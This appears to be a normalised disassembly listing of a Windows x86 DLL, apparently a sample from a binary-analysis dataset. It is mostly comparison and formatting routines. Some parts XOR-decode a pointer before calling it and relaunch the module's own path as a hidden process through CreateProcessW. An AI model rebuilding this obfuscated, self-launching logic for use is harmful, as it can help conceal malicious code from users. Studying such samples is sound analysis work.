test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_1005aa10
push ebp
mov ebp esp
push 0xffffffff
push sub_100824dc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi edx
xor esi esi
mov [ ebp - 0x14 ] esi
test edi edi
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
lea eax [ edx + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp eax 0x1
jne r-xdata
push 0x90
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
push 0xc8
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ebx [ ebx ]
push edx
push eax
mov ecx edi
call sub_1005bd40
jmp r-xdata
cmp eax 0x3
jne r-xdata
push 0xb0
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebx ]
push edx
push edi
mov edx eax
call sub_1001df90
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
cmp ecx edx
ja r-xdata
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x14 ] esi
mov eax [ rw-data ]
lea edx [ ebp - 0x14 ]
cmp edx eax
jae r-xdata
push 0xb8
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ebx [ ebx ]
push edx
mov ecx edi
call sub_1002ff90
jmp r-xdata
test eax eax
je r-xdata
mov eax rw-data
call sub_10019240
mov eax [ rw-data ]
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ ebx ]
mov edx [ ebp + 0x8 ]
push ecx
mov ecx [ edx ]
push ecx
push edi
push eax
call sub_10008920
jmp r-xdata
push 0x0
push 0x0
push 0x1
add eax 0x4
push 0x0
mov [ rw-data ] eax
call [ CreateEventW@IAT ]
xor ebx ebx
push ebx
xor edx edx
push ebx
mov [ ebp - 0x24 ] edx
lea edx [ ebp - 0x3c ]
push edx
push sub_1003e840
mov [ ebp - 0x3c ] eax
push ebx
mov eax sub_10053960
xor ecx ecx
push ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] rw-data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] rw-data
call [ CreateThread@IAT ]
mov [ esi + 0x4c ] eax
mov eax [ ebp - 0x3c ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x3c ]
mov al 0x38
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
push edx
call [ ebp + 0x8 ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ eax ] esi
test eax eax
je r-xdata
mov eax rw-data
call sub_10019240
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov ecx [ ecx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ rw-data ]
sub_1005ac40
cmp edi ebx
je r-xdata
mov eax edi
retn
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
inc [ eax ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
pop esi
test eax eax
je r-xdata
call sub_10020880
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1005ac7e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10056814
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1003e1ac
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_10011e8f
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_1002050e
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_1000a4a8
push sub_10083333
mov [ rw-data ] esi
call sub_10025945
pop ecx
sub_1005ad00
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x20000005
mov [ esi ] 0x0
mov eax [ ebx + 0xd8 ]
push edx
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x64
mov esp ebp
pop ebp
retn 0x4
push 0x400
push 0x8
mov [ ebp - 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push 0x400
add ecx eax
mov eax [ ebx + 0xdc ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edi ] eax
mov eax [ ebx + 0xdc ]
push edx
call eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ esi ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
mov eax 0x5
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov eax 0x6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
add [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
add eax 0x400
push eax
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
mov [ edi ] eax
add eax [ esi ]
mov edx [ ebx + 0xdc ]
push 0x400
push eax
push ecx
call edx
test eax eax
jne r-xdata
sub_1005ae42
push 0x80
mov eax sub_1007e3e6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8c ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x7c ] al
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x84 ]
push eax
mov ecx edi
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_100519c6
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x68 ] ebx
call sub_1002a730
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1002a674
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
xor ebx ebx
mov [ ebp - 0x80 ] al
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov al [ esi ]
mov [ ebp - 0x4 ] 0x2
cmp al 0x2b
je r-xdata
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x78 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x58 ] ebx
call sub_1001bc97
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x60 ] al
mov [ ebp - 0x5f ] 0x65
call sub_100783e0
push [ ebp - 0x50 ]
mov [ ebp - 0x70 ] eax
movsx eax [ ebp - 0x60 ]
push eax
push esi
call sub_100783e0
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x58 ]
add eax [ ebp - 0x50 ]
mov ecx [ edi + 0x20 ]
add eax [ ebp - 0x64 ]
add eax [ ebp - 0x5c ]
cmp [ edi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x60 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_100783e0
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx ebx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_1005be50
mov eax [ ebp - 0x70 ]
cmp eax ebx
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_100783e0
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10004394
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x54 ]
call sub_1000a47d
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x68 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov [ ebp - 0x68 ] al
mov eax [ ebp + 0x10 ]
push [ ebp - 0x68 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x84 ] eax
call sub_1006a3e7
push [ ebp - 0x64 ]
mov ecx [ ebp - 0x84 ]
mov eax [ ebp - 0x88 ]
push 0x30
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
mov [ ebp + 0x14 ] ecx
call sub_1000a47d
mov ecx [ eax ]
sub [ ebp - 0x50 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_1000a47d
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x78 ] ebx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
call sub_10050f80
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10004394
mov ecx [ eax ]
push [ ebp - 0x58 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x54 ]
call sub_1000a47d
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
mov [ ebp + 0x14 ] eax
push eax
push ecx
push [ ebp - 0x8c ]
mov [ edi + 0x20 ] ebx
push [ ebp - 0x54 ]
mov [ edi + 0x24 ] ebx
call sub_1000a47d
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov eax [ ebp - 0x8c ]
call sub_10019c00
retn
push [ ebp - 0x80 ]
sub eax esi
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x6c ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10004394
mov ecx [ eax ]
push [ ebp - 0x58 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
call sub_1000a47d
mov ecx [ eax ]
and [ ebp - 0x58 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ edi + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_1003fc32
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x58 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10051fc9
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_10050f80
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x5c ] ebx
push 0x30
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
call sub_1003fc32
mov ecx [ eax ]
sub [ ebp - 0x50 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
mov ebx [ ebp - 0x4c ]
push [ ebp - 0x64 ]
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10051fc9
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push ebx
call sub_10051fc9
and [ ebp - 0x64 ] 0x0
xor ebx ebx
push [ ebp - 0x5c ]
call sub_10050f80
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
mov [ ebp - 0x5c ] ebx
jae r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push eax
call sub_1007c060
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x78 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push ebx
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_10051fc9
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_1005b2f0
push ebp
mov ebp esp
sub esp 0xa8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ GetModuleFileNameW@IAT ]
push 0x104
lea eax [ ebp - 0x828 ]
push eax
push 0x0
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
push 0x104
lea ecx [ ebp - 0xa30 ]
push ecx
push edx
call esi
test eax eax
je r-xdata
push r--data
mov edx 0x7ffffffe
mov eax 0x30c
lea ecx [ ebp - 0x620 ]
call sub_1006b860
test eax eax
js r-xdata
lea eax [ ebp - 0x828 ]
push eax
lea esi [ ebp - 0x620 ]
call sub_1005da90
test eax eax
js r-xdata
push r--data
call sub_1005da90
test eax eax
js r-xdata
lea ecx [ ebp - 0xa30 ]
push ecx
call sub_1005da90
test eax eax
js r-xdata
push r--data
call sub_1005da90
test eax eax
js r-xdata
push rw-data
call sub_1005da90
test eax eax
js r-xdata
xor eax eax
push 0x44
push eax
lea edx [ ebp - 0xa88 ]
push edx
mov [ ebp - 0xa40 ] eax
mov [ ebp - 0xa3c ] eax
mov [ ebp - 0xa38 ] eax
mov [ ebp - 0xa34 ] eax
call sub_10078970
add esp 0xc
lea eax [ ebp - 0xa40 ]
push eax
lea ecx [ ebp - 0xa88 ]
push ecx
push 0x0
push 0x0
push 0x8000000
push 0x0
push 0x0
push 0x0
mov edx esi
push edx
push 0x0
mov [ ebp - 0xa88 ] 0x44
call [ CreateProcessW@IAT ]
sub_1005b440
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ eax + eax ]
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_10077d10
add esp 0xc
pop ebp
retn
sub_1005b460
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_10061091
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_10065045
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_100067d1
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_1002470e
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_1005b4e0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x1c ]
movzx eax ax
retn
mov eax [ ecx + 0x30 ]
